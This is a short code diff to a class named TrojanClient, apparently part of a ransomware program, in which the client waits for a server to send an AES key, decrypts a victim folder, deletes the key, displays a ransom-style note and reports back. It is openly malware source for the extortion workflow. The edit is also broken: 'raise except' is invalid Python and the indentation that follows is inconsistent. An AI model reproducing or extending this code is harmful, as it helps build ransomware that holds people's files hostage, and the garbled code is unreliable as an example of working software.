@@ -145,8 +145,13 @@ class TrojanClient:
         
         msg = protocol.receive(self.connection)
         msg_decode = msg.decode()
-        if (msg_decode == "sending decryption key"):
-            aes_key = protocol.receive(self.connection)
+        if (msg_decode != "sending decryption key"):
+            raise except
+        aes_key = protocol.receive(self.connection)
+        FileEncryptor.decrypt_folder(self.folder, aes_key)
+            del aes_key
+            RansomNote.display_decryption_note()
+            protocol.send(self.connection, "the files are decrypted")
 
 
 
